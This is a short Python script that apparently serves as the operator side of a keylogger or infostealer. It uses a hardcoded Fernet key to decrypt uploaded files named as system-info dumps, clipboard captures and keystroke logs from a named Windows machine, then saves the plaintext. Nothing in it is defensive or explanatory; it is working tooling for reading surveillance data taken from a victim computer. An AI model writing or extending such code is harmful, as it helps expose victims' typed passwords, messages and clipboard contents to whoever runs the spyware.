from cryptography.fernet import Fernet
import os

# Decryption Key
key = "e9pEXagLCMvIiyeOqsSf456koc4nmlHNIk9P7b5_7RE="
upload_folder = 'C:/Users/Hiba/Desktop/Server/upload/DESKTOP-4IH3VOH'
file_suffixes = ["e_systeminfo_", "e_clipboard_", "e_key_log_"]  # Process specific encrypted files

# Initialize Fernet
fernet = Fernet(key)

for root, dirs, files in os.walk(upload_folder):
    for file_name in files:
        if any(file_name.startswith(suffix) for suffix in file_suffixes):
            file_path = os.path.join(root, file_name)
            print(f"Attempting to decrypt file: {file_path}")

            try:
                # Read the encrypted file
                with open(file_path, 'rb') as f:
                    data = f.read()

                # Decrypt the data
                decrypted = fernet.decrypt(data)

                # Save the decrypted content
                decrypted_file_path = file_path.replace("e_", "d_")
                with open(decrypted_file_path, 'wb') as f:
                    f.write(decrypted)
                print(f"Decrypted file saved at: {decrypted_file_path}")

            except Exception as e:
                print(f"Failed to decrypt file {file_name}: {e}")



